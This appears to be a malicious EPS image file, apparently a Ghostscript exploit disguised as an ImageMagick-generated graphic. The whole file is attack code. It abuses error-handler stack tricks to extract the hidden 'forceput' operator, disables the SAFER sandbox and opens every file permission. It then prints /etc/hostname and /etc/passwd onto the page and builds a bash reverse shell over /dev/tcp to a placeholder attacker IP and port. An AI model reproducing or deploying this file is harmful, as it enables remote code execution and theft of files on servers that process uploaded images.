%!PS-Adobe-3.0 EPSF-3.0
%%Creator: (ImageMagick)
%%Title: (hui.pdf)
%%CreationDate: (2020-04-28T01:33:39+03:00)
%%BoundingBox: -0 -0 600 600
%%HiResBoundingBox: 0 0 600 600
%%DocumentData: Clean7Bit
%%LanguageLevel: 1
%%Pages: 1
%%EndComments

%%BeginDefaults
%%EndDefaults

%%BeginProlog

/BackconnectHost (<WRITE IP HERE>) def  % <- put your backconnect IP here
/BackconnectPort (12345) def % <- put the backconnect port here

% RANDOMstring111 12345 <- change random string here in order to prevent caching

%%EndProlog
%%Page:  1 1
%%PageBoundingBox: 0 0 600 600

/fill {
    0 exch
    1 exch
    { exch } for
} def

errordict /stackoverflow {
    (#1 stackoverflow\n) print
    pop
    pop
    errordict /stackunderflow {
        (#2 stackunderflow\n) print
        pop
        errordict /stackunderflow {
            (#3 stackunderflow\n) print
            pop
            errordict /stackunderflow {
                (#4 stackunderflow\n) print
                pop
                errordict /stackunderflow {
                    (#5 stackunderflow\n) print
                    pop
                    errordict /stackoverflow {
                        (#6 stackoverflow\n) print
                        pop
                        pop
                        (string)
                        (another string)
                        errordict /typecheck {
                            (#7 typecheck\n) print
                            pop
                            3 get
                            3 get
                            6 get
                            /forceput exch def
                            pop
                        } put                        
                    } put
                    0 300370 fill
                } put
            } put
        } put
    } put
} put

/ebulka systemdict /.origundefinefont get def

(nothing\n) 300370 fill

(Starting attack\n) print

(somestring\n)

ebulka

(Forceput extracted\n) print

systemdict /SAFER false forceput
systemdict /userparams get /LockFilePermissions false forceput
systemdict /userparams get /PermitFileControl [(*)] forceput
systemdict /userparams get /PermitFileWriting [(*)] forceput
systemdict /userparams get /PermitFileReading [(*)] forceput
save restore

SAFER {{ 
    (Sluchilsya posos :[ ) print
}} bind executeonly if

(Exploit seems worked\n) print

/Times findfont 30 scalefont setfont

/printfile {
    (r) file /data exch def

    0 1 1000 {
        0 exch
        8 mul
        moveto    
        data 100000 string readline pop dup
        show
    } for

    data closefile    
} def

/listdir {
    /i 0 def
    (/) {  % directory here
        dup
        dup search { % substring to search in filename here (not containing the string will be filtered out).
            pop pop pop
            i 1 add /i exch def
            0 i 8 mul moveto
            show
        } {
            pop
            pop
        } ifelse        
    } 10000 string filenameforall
} def

0.1 0 0 setrgbcolor
(/etc/hostname) printfile

/concat
{ exch dup length    
  2 index length add string    
  dup dup 4 2 roll copy length
  4 -1 roll putinterval
} bind def  


(%pipe%bash -c 'exec 3<>/dev/tcp/) BackconnectHost (/) BackconnectPort (;exec sh -i <&3 >&3 2>&3') concat concat concat concat

%(/etc/passwd)
printfile

%huia

%%PageTrailer
%%Trailer
%%EOF